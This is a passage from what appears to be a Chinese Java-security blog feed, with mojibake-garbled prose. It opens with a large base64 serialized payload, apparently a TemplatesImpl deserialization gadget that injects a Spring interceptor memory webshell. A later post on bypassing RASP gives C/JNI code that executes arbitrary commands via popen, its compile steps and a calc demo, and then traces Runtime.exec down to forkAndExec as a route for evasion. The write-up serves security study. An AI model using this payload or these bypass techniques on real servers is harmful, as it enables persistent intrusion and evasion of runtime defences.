QUFrQWtnQkJBRDBBUGdBS0FBQUEzQUF2QURBQUFBQUFBTndBUHdCQUFBRUFBQURjQUVFQVFnQUNBQUFBM0FCREFFUUFBd0FLQU5JQVJRQThBQVFBUmdBQUFGVUFCLzBBUmdjQVJ3Y0FTUHdBR3djQVNmOEFMd0FMQndCS0J3QkxCd0JNQndCTkJ3QkhCd0JJQndCSkJ3Qk9Cd0JQQndCSEJ3QlFBQUFuL3dBYkFBVUhBRW9IQUVzSEFFd0hBRTBIQUVjQUFRY0FVUUVCQUZJQUFBQUVBQUVBSkFCVEFBQUFEUU1BUHdBQUFFRUFBQUJEQUFBQUFRQlVBRlVBQXdBc0FBQUFZQUFGQUFVQUFBQUtLaXNzTFJrRXR3QWxzUUFBQUFJQUxRQUFBQW9BQWdBQUFDNEFDUUF2QUM0QUFBQTBBQVVBQUFBS0FDOEFNQUFBQUFBQUNnQS9BRUFBQVFBQUFBb0FRUUJDQUFJQUFBQUtBRU1BUkFBREFBQUFDZ0JXQUZjQUJBQlNBQUFBQkFBQkFDUUFVd0FBQUJFRUFEOEFBQUJCQUFBQVF3QUFBRllBQUFBQkFGZ0FXUUFEQUN3QUFBQmdBQVVBQlFBQUFBb3FLeXd0R1FTM0FDYXhBQUFBQWdBdEFBQUFDZ0FDQUFBQU13QUpBRFFBTGdBQUFEUUFCUUFBQUFvQUx3QXdBQUFBQUFBS0FEOEFRQUFCQUFBQUNnQkJBRUlBQWdBQUFBb0FRd0JFQUFNQUFBQUtBRm9BV3dBRUFGSUFBQUFFQUFFQUpBQlRBQUFBRVFRQVB3QUFBRUVBQUFCREFBQUFXZ0FBQUFFQVhBQUFBQUlBWFE9PQEAFnN1bi9taXNjL0JBU0U2NERlY29kZXIMAKQApQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL1N0cmluZwcApgwApwBTDACoAKkHAKoHAKsMAKwArQwArgCvAQAQamF2YS9sYW5nL09iamVjdAEAO29yZy5jbG93bi5zcHJpbmdib290bWVtb3J5c2hlbGwuaW50ZXJjZXB0b3IuVGVzdEludGVyY2VwdG9yDACwALEMALIAswwAtAC1BwC2DAC3ALgBADJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L0hhbmRsZXJJbnRlcmNlcHRvcgwAuQC6AQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAGGNvbS9jbG93bi9JbnRlcmNlcHRvckRlcwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEAPG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0Q29udGV4dEhvbGRlcgEAGGN1cnJlbnRSZXF1ZXN0QXR0cmlidXRlcwEAPSgpTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlczsBADlvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvUmVxdWVzdEF0dHJpYnV0ZXMBAAxnZXRBdHRyaWJ1dGUBACcoTGphdmEvbGFuZy9TdHJpbmc7SSlMamF2YS9sYW5nL09iamVjdDsBAAdnZXRCZWFuAQAlKExqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAA9wcmludFN0YWNrVHJhY2UBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAMZGVjb2RlQnVmZmVyAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAEWphdmEvbGFuZy9JbnRlZ2VyAQAEVFlQRQEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAEGph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<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241114162939356.png" alt="image-20241114162939356"></p><p><img src="https://cdn.clown2024.cn/image-20241114163005607.png" alt="image-20241114163005607"></p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://xz.aliyun.com/t/12047?time__1311=GqGxR70QD=G=itD/YriQGkbvkp6QHKF4D&u_atoken=3b72cba8102056dc353d4296b75d2ed3&u_asig=0a47319217313359997215116e009a">https://xz.aliyun.com/t/12047?time__1311=GqGxR70QD%3DG%3DitD%2FYriQGkbvkp6QHKF4D&amp;u_atoken=3b72cba8102056dc353d4296b75d2ed3&amp;u_asig=0a47319217313359997215116e009a</a></p><p><a href="https://github.com/Y4tacker/JavaSec/blob/main/5.%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/Spring/%E5%88%A9%E7%94%A8intercetor%E6%B3%A8%E5%85%A5Spring%E5%86%85%E5%AD%98%E9%A9%AC/code/TouchFilea.java">https://github.com/Y4tacker/JavaSec/blob/main/5.%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/Spring/%E5%88%A9%E7%94%A8intercetor%E6%B3%A8%E5%85%A5Spring%E5%86%85%E5%AD%98%E9%A9%AC/code/TouchFilea.java</a></p><p><a href="https://github.com/Y4tacker/JavaSec/blob/main/5.%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/Spring/%E5%88%A9%E7%94%A8intercetor%E6%B3%A8%E5%85%A5Spring%E5%86%85%E5%AD%98%E9%A9%AC/index.md">https://github.com/Y4tacker/JavaSec/blob/main/5.%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/Spring/%E5%88%A9%E7%94%A8intercetor%E6%B3%A8%E5%85%A5Spring%E5%86%85%E5%AD%98%E9%A9%AC/index.md</a></p><p><a href="https://forum.butian.net/share/3002">https://forum.butian.net/share/3002</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RASPç»•è¿‡å­¦ä¹ </title>
      <link href="/2024/11/07/RASP%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/11/07/RASP%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="raspä»‹ç»"><a href="#RASPä»‹ç»" class="headerlink" title="RASPä»‹ç»"></a>RASPä»‹ç»</h1><p>RASPå…¨ç§°æ˜¯Runtime applicaion self-protectionï¼Œåœ¨2014å¿µæå‡ºçš„ä¸€ç§åº”ç”¨ç¨‹åºè‡ªæˆ‘ä¿æŠ¤æŠ€æœ¯ï¼Œå°†é˜²æŠ¤åŠŸèƒ½æ³¨å…¥åˆ°åº”ç”¨ç¨‹åºä¹‹ä¸­ï¼Œé€šè¿‡å°‘é‡çš„Hookå‡½æ•°ç›‘æµ‹ç¨‹åºçš„è¿è¡Œï¼Œæ ¹æ®å½“å‰çš„ä¸Šä¸‹æ–‡ç¯å¢ƒå®æ—¶é˜»æ–­æ”»å‡»äº‹ä»¶ã€‚</p><p>ç›®å‰Java RASPä¸»è¦æ˜¯é€šè¿‡Instrumentationç¼–å†™Agentçš„å½¢å¼ï¼Œåœ¨Agentçš„premainå’Œagentmainä¸­åŠ å…¥æ£€æµ‹ç±»ä¸€èˆ¬ç»§æ‰¿äºClassFileTransformerï¼Œå½“ç¨‹åºè¿è¡Œè¿›æ¥çš„æ—¶å€™ï¼Œé€šè¿‡ç±»ä¸­çš„transformæ£€æµ‹å­—èŠ‚ç æ–‡ä»¶ä¸­æ˜¯å¦æœ‰ä¸€äº›æ•æ„Ÿçš„ç±»æ–‡ä»¶ï¼Œæ¯”å¦‚ProcessImplç­‰ã€‚ç®€å•çš„å¯ä»¥ç†è§£ä¸ºé€šè¿‡Instrumentationæ¥å¯¹JVMè¿›è¡Œå®æ—¶ç›‘æ§ã€‚</p><p>Instrumentation API æä¾›äº†ä¸¤ä¸ªæ ¸å¿ƒæ¥å£ï¼šClassFileTransformer å’Œ Instrumentationã€‚ClassFileTransformer æ¥å£å…è®¸å¼€å‘è€…åœ¨ç±»åŠ è½½å‰æˆ–ç±»é‡æ–°å®šä¹‰æ—¶å¯¹å­—èŠ‚ç è¿›è¡Œè½¬æ¢ã€‚Instrumentation æ¥å£åˆ™æä¾›äº†å¯åŠ¨æ—¶ä»£ç†å’Œé‡æ–°å®šä¹‰ç±»çš„èƒ½åŠ›</p><p>Java Agentå­˜åœ¨premainå’Œagentmainä¸¤ä¸ªæ–¹æ³•ï¼Œå…³äºè¿™ä¸¤ä¸ªæ–¹æ³•åœ¨ä¹‹å‰çš„java agentä¹Ÿè¯´è¿‡äº†ï¼Œè¿™é‡Œå°±ä¸å†è¯´äº†</p><p>æ‰€ä»¥å…¶å®å°±æ˜¯å’Œå‰é¢çš„æ–‡ç« ä¸€æ ·ç¼–å†™ä¸€ä¸ªClassFileTransformerçš„å®ç°ç±»ï¼Œä½¿ç”¨è¯¥ç±»æ¥å¯¹ç¨‹åºè¿›è¡Œå®æ—¶ç›‘æ§ï¼Œå¦‚æœæ£€æµ‹åˆ°ç›¸å…³çš„å±é™©å‡½æ•°ï¼Œå°±é€šè¿‡transformæ–¹æ³•æ¥å¯¹ç±»å­—èŠ‚ç è¿›è¡Œè½¬åŒ–ã€‚</p><p>ä¸ä¼ ç»Ÿ WAF å¯¹æ¯”ï¼Œ RASP å®ç°æ›´ä¸ºåº•å±‚ï¼Œè§„åˆ™åˆ¶å®šæ›´ä¸ºç®€å•ï¼Œæ”»å‡»è¡Œä¸ºè¯†åˆ«æ›´ä¸ºç²¾å‡†ã€‚</p><h1 id="raspç»•è¿‡åŸç†"><a href="#RASPç»•è¿‡åŸç†" class="headerlink" title="RASPç»•è¿‡åŸç†"></a>RASPç»•è¿‡åŸç†</h1><p>æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼ŒRASPä¸»è¦æ˜¯é€šè¿‡è½¬æ¢å­—èŠ‚ç æ¥è¾¾åˆ°ç›®çš„ï¼Œå¦‚æœè®¾ç½®çš„æ£€æµ‹çš„æ–¹æ³•å­˜åœ¨ç€æ›´åº•å±‚çš„æ–¹æ³•æˆ–è€…ç›¸åŒå±‚çº§çš„ä¸åŒæ–¹æ³•èƒ½å¤Ÿè¾¾åˆ°ç›¸åŒçš„æ•ˆæœï¼Œé‚£ä¹ˆå°±èƒ½å®Œæˆç»•è¿‡ã€‚</p><p>æ‰€ä»¥ç»•è¿‡çš„æ‰‹æ³•å¤§è‡´ä¸ºä¸¤ç§ï¼š</p><ol><li>å¯»æ‰¾æ²¡æœ‰è¢«é™åˆ¶çš„ç±»æˆ–è€…å‡½æ•°æ¥ç»•è¿‡ï¼Œä¹Ÿå°±æ˜¯ç»•è¿‡é»‘åå•</li><li>åˆ©ç”¨æ›´åº•å±‚çš„æŠ€æœ¯è¿›è¡Œç»•è¿‡ï¼Œä¾‹å¦‚ä» C ä»£ç çš„å±‚é¢è¿›è¡Œç»•è¿‡</li></ol><h1 id="jniç»•è¿‡"><a href="#JNIç»•è¿‡" class="headerlink" title="JNIç»•è¿‡"></a>JNIç»•è¿‡</h1><p>JNIï¼ˆJava Native Interfaceï¼‰æ˜¯ Java æä¾›çš„ä¸€ç§æœºåˆ¶ï¼Œç”¨äºåœ¨ Java ç¨‹åºä¸­è°ƒç”¨æœ¬åœ°ï¼ˆNativeï¼‰ä»£ç ï¼Œå³ä½¿ç”¨å…¶ä»–è¯­è¨€ï¼ˆå¦‚Cã€C++ï¼‰ç¼–å†™çš„ä»£ç ï¼Œä»è€Œå¯ä»¥å……åˆ†åˆ©ç”¨æœ¬åœ°ä»£ç çš„åŠŸèƒ½å’Œæ€§èƒ½ä¼˜åŠ¿ï¼Œå®ç°å¯¹åº•å±‚ç³»ç»Ÿèµ„æºå’Œå¤–éƒ¨åº“çš„è®¿é—®ã€‚</p><p>JNIçš„è®¾è®¡æ˜¯ä¸ºäº†è§£å†³javaæ— æ³•ç›´æ¥è®¿é—®åº•å±‚ç³»ç»Ÿèµ„æºæˆ–è€…åˆ©ç”¨æœ¬åœ°åº“çš„é—®é¢˜ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥ç»•è¿‡RASPã€‚æˆ‘ä»¬ç¼–å†™çš„ä»£ç æœ€åæ˜¯è¦ç¼–è¯‘ä¸ºdllåŠ¨æ€é“¾æ¥åº“æˆ–è€…soåŠ¨æ€å…±äº«åº“ï¼Œç„¶åJNIé€šè¿‡åŠ è½½è¿™äº›å…±äº«åº“æ¥æ‰§è¡Œæˆ‘ä»¬ç¼–å†™çš„æœ¬åœ°ä»£ç </p><p>æˆ‘ä»¬å†™ä¸€ä¸ªJNIä½¿ç”¨dllçš„ä¾‹å­ï¼Œå†™ä¸€ä¸ªæ‰§è¡Œå‘½ä»¤çš„æ–¹æ³•</p><p>javaæ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Command</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> String <span class="hljs-title function_">exec</span><span class="hljs-params">(String cmd)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å°†å…¶ç¼–è¯‘æˆ.classæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">javac Command.java<br></code></pre></td></tr></table></figure><p>ç„¶åå†ç”¨ä¸‹é¢çš„å‘½ä»¤ç”Ÿæˆcè¯­è¨€çš„.hå¤´æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">javah -jni Command<br></code></pre></td></tr></table></figure><p>ç„¶åå†å»ç¼–å†™Command.cæ–‡ä»¶</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;Command.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;jni.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">execmd</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *cmd, <span class="hljs-type">char</span> *result)</span><br>&#123;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">1024</span>*<span class="hljs-number">12</span>];   <br>    FILE *pipe = popen(cmd, <span class="hljs-string">&quot;r&quot;</span>); <br>    <span class="hljs-keyword">if</span> (!pipe)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">while</span> (!feof(pipe))<br>    &#123;<br>        <span class="hljs-keyword">if</span> (fgets(buffer, <span class="hljs-keyword">sizeof</span>(buffer), pipe))<br>        &#123; <br>            <span class="hljs-built_in">strcat</span>(result, buffer);<br>        &#125;<br>    &#125;<br>    pclose(pipe); <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;     <br>&#125;<br>JNIEXPORT jstring JNICALL <span class="hljs-title function_">Java_Command_exec</span><span class="hljs-params">(JNIEnv *env, jobject class_object, jstring jstr)</span><br>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *cstr = (*env)-&gt;GetStringUTFChars(env, jstr, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-type">char</span> result[<span class="hljs-number">1024</span> * <span class="hljs-number">12</span>] = <span class="hljs-string">&quot;&quot;</span>; <br>    execmd(cstr, result);<br>    <span class="hljs-type">char</span> return_messge[<span class="hljs-number">100</span>] = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-built_in">strcat</span>(return_messge, result);<br>    jstring cmdresult = (*env)-&gt;NewStringUTF(env, return_messge);<br>    <span class="hljs-keyword">return</span> cmdresult;<br>&#125;<br></code></pre></td></tr></table></figure><p>å†™å¥½ä¹‹åè¿›è¡Œç¼–è¯‘ï¼Œç¼–è¯‘æˆdllæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">gcc -I <span class="hljs-string">&quot;D:\CTF\Java\JDK\jdk1.8.0_65\include&quot;</span> -I <span class="hljs-string">&quot;D:\CTF\Java\JDK\jdk1.8.0_65\include\win32&quot;</span> -D__int64=<span class="hljs-string">&quot;long long&quot;</span> --shared <span class="hljs-string">&quot;D:\CTF\Java\JavaCode\JNITest\src\main\java\Command.c&quot;</span>  -o ./jni.dll<br></code></pre></td></tr></table></figure><blockquote><p>-D æ˜¯ <code>gcc</code> ç¼–è¯‘å™¨çš„ä¸€ä¸ªé¢„å¤„ç†å™¨å‚æ•°ï¼Œç”¨äºå®šä¹‰å®</p><p>-Iç”¨äºæŒ‡å®šé¢å¤–çš„ç›®å½•ï¼Œè®©ç¼–è¯‘å™¨åœ¨è¿™äº›ç›®å½•ä¸­æœç´¢å¤´æ–‡ä»¶</p></blockquote><p><img src="https://cdn.clown2024.cn/image-20241107203652320.png" alt="image-20241107203652320"></p><p>ç„¶åç”¨System.loadæˆ–è€…System.loadsæ–¹æ³•å°±å¯ä»¥åŠ è½½è¿™ä¸ªdllï¼Œç„¶åå°±å¯ä»¥å®ä¾‹åŒ–Commandç±»è°ƒç”¨ä»–çš„nativeæ–¹æ³•äº†</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.out.println(System.getProperty(<span class="hljs-string">&quot;java.library.path&quot;</span>));<br><span class="hljs-comment">//        System.loadLibrary(&quot;jni&quot;); //load()æŒ‡å®šç»å¯¹è·¯å¾„</span><br>        System.load(<span class="hljs-string">&quot;D:\\CTF\\Java\\JavaCode\\JNITest\\src\\main\\java\\jni.dll&quot;</span>);<br>        <span class="hljs-type">Command</span> <span class="hljs-variable">command</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Command</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">ipconfig</span> <span class="hljs-operator">=</span> command.exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        System.out.println(ipconfig);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>è¿™ä¸ªjava.library.pathæ˜¯javaæœç´¢å…±äº«åº“çš„è·¯å¾„ï¼Œå¦‚æœç”¨loadLibraryæ–¹æ³•çš„è¯ï¼Œä»–æ˜¯ä¸èƒ½å¸¦è·¯å¾„çš„ï¼Œåªèƒ½ä»java.library.pathä¸­æœç´¢å¹¶åŠ è½½ï¼Œæ‰€ä»¥è¦ç”¨loadLibraryæ–¹æ³•åŠ è½½dllçš„è¯éœ€è¦ç¡®ä¿dllåœ¨æœå¯»è·¯å¾„ä¸‹é¢</p></blockquote><p>æ‰§è¡Œå°±å¯ä»¥å¼¹è®¡ç®—å™¨äº†</p><p><img src="https://cdn.clown2024.cn/image-20241107204035199.png" alt="image-20241107204035199"></p><p>æ‰€ä»¥å…¶å®ç»•è¿‡å°±æ˜¯èƒ½æŠŠæˆ‘ä»¬å†™çš„soä¸Šä¼ çš„æœåŠ¡å½“ä¸­å»ï¼Œå¯ä»¥é€šè¿‡javaçš„webshellã€æ–‡ä»¶ä¸Šä¼ ã€æˆ–è€…ååºåˆ—åŒ–ç­‰æ–¹å¼ï¼ŒåŠ è½½æˆ‘ä»¬å†™å¥½çš„soæˆ–è€…dll</p><p>è¿™é‡Œæœ‰ä¸€äº›JNIå‘½ä»¤æ‰§è¡Œçš„è„šæœ¬ä¾‹å­ï¼š<a href="https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-CommandExecution-README.md">https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-CommandExecution-README.md</a></p><h1 id="unixprocessç»•è¿‡"><a href="#UNIXProcessç»•è¿‡" class="headerlink" title="UNIXProcessç»•è¿‡"></a>UNIXProcessç»•è¿‡</h1><p>è¯´å®è¯ä¸€å¼€å§‹çœ‹åˆ°è¿™ä¸ªä¸œè¥¿æˆ‘æ˜¯å¾ˆæ‡µçš„ï¼Œæ ¹æœ¬æ²¡å¬è¿‡ï¼Œçœ‹äº†ä¸€ä¸‹æ‰çŸ¥é“è¿™ä¸ªæ˜¯Runtime.exec()è°ƒç”¨é“¾çš„æœ«ç«¯ï¼Œå¹³æ—¶åªä¼šç”¨å¹¶æ²¡æœ‰å…³æ³¨è¿‡ç›¸å…³çš„è°ƒç”¨é“¾</p><p>RASPæœ‰äº›é’ˆå¯¹å‘½ä»¤æ‰§è¡Œçš„è¿‡æ»¤å°±æ˜¯å¯¹è°ƒç”¨é“¾ä¸­çš„<strong>java.lang.ProcessImpl.start</strong>æ–¹æ³•è¿›è¡Œè¿‡æ»¤ã€‚</p><p><strong>é‚£æ¥åˆ†æä¸€ä¸‹å‘½ä»¤æ‰§è¡Œçš„è°ƒç”¨é“¾</strong></p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-CommandExecution-README.md">https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-CommandExecution-README.md</a></p><p><code>Runtime.exec(xxx)</code>è°ƒç”¨é“¾å¦‚ä¸‹:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">java.lang.UNIXProcess.&lt;init&gt;(UNIXProcess.java:247)<br>java.lang.ProcessImpl.start(ProcessImpl.java:134)<br>java.lang.ProcessBuilder.start(ProcessBuilder.java:1029)<br>java.lang.Runtime.exec(Runtime.java:620)<br>java.lang.Runtime.exec(Runtime.java:450)<br>java.lang.Runtime.exec(Runtime.java:347)<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥å¹³æ—¶ç”¨çš„ProcessBuilder.startçš„æ‰§è¡Œå‘½ä»¤çš„æ–¹æ³•ä¹Ÿå¤„äºè¿™ä¸ªè°ƒç”¨é“¾ä¸Š</p><p>ProcessBuilderæ‰§è¡Œå‘½ä»¤</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;calc&quot;</span>).start();<br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„è°ƒç”¨æ ˆæ˜¯Linuxçš„ï¼Œä»å­—é¢ä¹Ÿå¯ä»¥çœ‹å¾—åˆ°è¿™æ˜¯UNIXProcessï¼ŒWindowsçš„è¯æˆ‘è‡ªå·±è·Ÿè¿›å‘ç°ä»–å’ŒLinuxä¸åŒçš„å°±æ˜¯æœ€ç»ˆé‚£ä¸€æ­¥ï¼ŒUNIXProcesså˜æˆProcessImpl.create</p><p><img src="https://cdn.clown2024.cn/image-20241108135939928.png" alt="image-20241108135939928"></p><p>åœ¨è¯¥nativeæ–¹æ³•å®ç°é‡Œé¢å°±ä¼šè°ƒç”¨Windowsçš„apiæ¥åˆ›å»ºä¸€ä¸ªæ–°çš„è¿›ç¨‹</p><p>è¿™é‡Œè¿˜æ˜¯ç»§ç»­è·Ÿç€æ–‡ç« çš„Linuxç‰ˆæœ¬æ¥åˆ†æï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å…³æ³¨çš„å°±æ˜¯<code>UNIXProcess</code>å’Œ<code>ProcessImpl</code>ï¼Œåœ¨JDK9ä¹‹åæŠŠ<code>UNIXProcess</code>åˆå¹¶åˆ°äº†<code>ProcessImpl</code>å½“ä¸­</p><p>ä»–ä»¬æœ€ç»ˆè°ƒç”¨çš„nativeæ–¹æ³•æ˜¯forkAndExecæ–¹æ³•ï¼Œå¦‚æ–¹æ³•åæ‰€è¿°ä¸»è¦æ˜¯é€šè¿‡<code>fork&amp;exec</code>æ¥æ‰§è¡Œæœ¬åœ°ç³»ç»Ÿå‘½ä»¤</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">native</span> <span class="hljs-type">int</span> <span class="hljs-title function_">forkAndExec</span><span class="hljs-params">(<span class="hljs-type">int</span> mode, <span class="hljs-type">byte</span>[] helperpath,</span><br><span class="hljs-params">                                   <span class="hljs-type">byte</span>[] prog,</span><br><span class="hljs-params">                                   <span class="hljs-type">byte</span>[] argBlock, <span class="hljs-type">int</span> argc,</span><br><span class="hljs-params">                                   <span class="hljs-type">byte</span>[] envBlock, <span 